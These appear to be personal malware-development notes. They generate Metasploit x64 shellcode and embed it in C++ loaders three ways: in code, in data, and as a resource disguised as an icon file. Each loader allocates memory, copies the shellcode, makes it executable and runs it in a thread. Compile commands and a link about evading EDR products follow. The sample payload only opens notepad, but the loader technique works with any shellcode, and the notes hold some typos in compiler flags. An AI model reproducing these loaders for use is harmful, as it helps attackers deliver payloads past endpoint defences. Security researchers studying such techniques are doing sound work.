


	MetaSploit Shell code Part:

		use payload/windows/x64/exec
		show options
		set CMD   notepad.exe
		set EXITFUNC thread
		generate -f raw -o notepad.bin
		

	then

	xxd notepad.bin

	then

	hxd - notebin - export 2 c and open in the vs code developmenet folder
	

	then 2 vm

	mkdir embed-shellcode
		mkdir embed-data
		mkdir embed-text  
		mkdir embed-rsrc

	then
	
	new-item embed-text.cpp


	// Your First C++ Program

#include<stdio.h>
#include<string.h>
#include<windows.h>
int main(void)
{

    //shellcode
unsigned char Shelldata[279] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
	0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
	0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
	0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
	0xDA, 0xFF, 0xD5, 0x6E, 0x6F, 0x74, 0x65, 0x70, 0x61, 0x64, 0x2E, 0x65,
	0x78, 0x65, 0x00
};

//shell code length

unsigned int sclen= 279;

// Allocate memmory 2 copy & execute shellcode

LPVOID memmaddrr= VirtualAlloc(NULL,sclen,MEM_COMMIT | MEM_RESERVE,PAGE_READWRITE
  //[in, optional] LPVOID lpAddress,
  //[in]           SIZE_T dwSize,
  //[in]           DWORD  flAllocationType,
  //[in]           DWORD  flProtect
);

RtlMoveMemory(memmaddrr,Shelldata,sclen
  //_Out_       VOID UNALIGNED *Destination,
  //_In_  const VOID UNALIGNED *Source,
 // _In_        SIZE_T         Length
);

// Make Shellcode execute by changing the protection back to execute

DWORD old_protect = 0;

BOOL returned_vp=VirtualProtect(memmaddrr,sclen,PAGE_EXECUTE_READ, &old_protect
  //[in]  LPVOID lpAddress,
  //[in]  SIZE_T dwSize,
  //[in]  DWORD  flNewProtect,
  //[out] PDWORD lpflOldProtect
);
 
//execute thread

if(returned_vp!= NULL)
{
    HANDLE thread_handle= CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)memmaddrr,NULL,NULL,NULL
  //[in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
  //[in]            SIZE_T                  dwStackSize,
  //[in]            LPTHREAD_START_ROUTINE  lpStartAddress,
  //[in, optional]  __drv_aliasesMem LPVOID lpParameter,
  //[in]            DWORD                   dwCreationFlags,
  //[out, optional] LPDWORD                 lpThreadId
    );

// Wait 4 thread to be completed

    WaitForSingleObject(thread_handle,INFINITE
  //[in] HANDLE hHandle,
  //[in] DWORD  dwMilliseconds
);

}

}



.........


	cp .\embed-text.cpp ..\embed-data\embed-data.cpp
	

// Your First C++ Program

#include<stdio.h>
#include<string.h>
#include<windows.h>

//shellcode
unsigned char Shelldata[279] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
	0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
	0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
	0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
	0xDA, 0xFF, 0xD5, 0x6E, 0x6F, 0x74, 0x65, 0x70, 0x61, 0x64, 0x2E, 0x65,
	0x78, 0x65, 0x00
};

//shell code length

unsigned int sclen= 279;

int main(void)
{
 
// Allocate memmory 2 copy & execute shellcode

LPVOID memmaddrr= VirtualAlloc(NULL,sclen,MEM_COMMIT | MEM_RESERVE,PAGE_READWRITE
  //[in, optional] LPVOID lpAddress,
  //[in]           SIZE_T dwSize,
  //[in]           DWORD  flAllocationType,
  //[in]           DWORD  flProtect
);

RtlMoveMemory(memmaddrr,Shelldata,sclen
  //_Out_       VOID UNALIGNED *Destination,
  //_In_  const VOID UNALIGNED *Source,
 // _In_        SIZE_T         Length
);

// Make Shellcode execute by changing the protection back to execute

DWORD old_protect = 0;

BOOL returned_vp=VirtualProtect(memmaddrr,sclen,PAGE_EXECUTE_READ, &old_protect
  //[in]  LPVOID lpAddress,
  //[in]  SIZE_T dwSize,
  //[in]  DWORD  flNewProtect,
  //[out] PDWORD lpflOldProtect
);
 
//execute thread

if(returned_vp!= NULL)
{
    HANDLE thread_handle= CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)memmaddrr,NULL,NULL,NULL
  //[in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
  //[in]            SIZE_T                  dwStackSize,
  //[in]            LPTHREAD_START_ROUTINE  lpStartAddress,
  //[in, optional]  __drv_aliasesMem LPVOID lpParameter,
  //[in]            DWORD                   dwCreationFlags,
  //[out, optional] LPDWORD                 lpThreadId
    );

// Wait 4 thread to be completed

    WaitForSingleObject(thread_handle,INFINITE
  //[in] HANDLE hHandle,
  //[in] DWORD  dwMilliseconds
);

}

}


............


 cp .\embed-text.cpp ..\embed-rsrc\embed-rsrc.cpp

	Steps:

	1. Remove payload and its length from program ( An actual file embed-rsrc.cpp)
	2. Copy notepad32.bin into embed-rsrc directory
	3. Rename notepad32.bin to notepad32.ico

	4. Create a new item rsrc.rc file inside embed-rsrc directory
	5. rsrc.rc file		...

			#define SC_ICON 2583
			SC_ICON RCDATA "notepad32.ico"

	And now modify the actual file of embed-rsrc.cpp file ( that is above main )

			#define SC_ICON 2583

	    Now can use win32 api to find resource 

	   

		HRSRC shellcode= FindResourceA(NULL,MAKEINTRESOURCEA(SC_ICON),RT_RCDATA
  //[in, optional] HMODULE hModule,
  //[in]           LPCSTR  lpName,
  //[in]           LPCSTR  lpType
);


		HGLOBAL shellcode_handle=LoadResource(NULL,shellcode
  //[in, optional] HMODULE hModule,
  //[in]           HRSRC   hResInfo
);


	//get pointer to the shellcode payload

	LPVOID shellcode_payload = LockResource(shellcode_handle
  //[in] HGLOBAL hResData
);

	//get length of shellcode paylaod

	DWORD shellcode_length = SizeofResource(NULL,shellcode
  //[in, optional] HMODULE hModule,
  //[in]           HRSRC   hResInfo
);


...........


	And Finally

	Open Terminal

		1.that s inside ( embed-rsrc): rc rsrc.rc
		
		2.cvtres /MACHINE:X64 /OUT:rsrc.o rsrc.res

		3. cl.exe /nologo /0x /W0 /GS -/DNDEBUG /Tcembed-rsrc.cpp /link /OUT:embed-rsrc.exe /SUBSYSTEM:CONSOLE /MACHINE:X86 rsrc.o
		............


		And Final Try:

		https://redops.at/en/blog/meterpreter-vs-modern-edrs-in-2023
			

			

	




	
	
		